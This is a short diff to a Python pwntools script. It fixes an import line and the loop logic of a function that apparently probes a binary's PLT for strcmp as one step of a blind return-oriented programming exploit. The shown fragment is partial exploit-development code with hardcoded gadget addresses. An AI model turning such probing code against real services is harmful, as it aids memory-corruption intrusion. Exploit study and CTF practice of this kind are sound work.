@@ -1,4 +1,4 @@
-import pwn from *
+from pwn import *
 
 def get_strcmp(size = 72, plt_addr = 0x400570, num_entries = 10, brop_addr = 0x40078a):
     
@@ -17,9 +17,9 @@ def get_strcmp(size = 72, plt_addr = 0x400570, num_entries = 10, brop_addr = 0x4
             call(probe, size, brop_addr, bad, bad)):
             
             return probe
-        else:
-            log.info("Not found!")
-            return 0
+        
+    log.info("Not found!")
+    return 0
 
 # return: 
 #    crash -> True; not crashed -> False
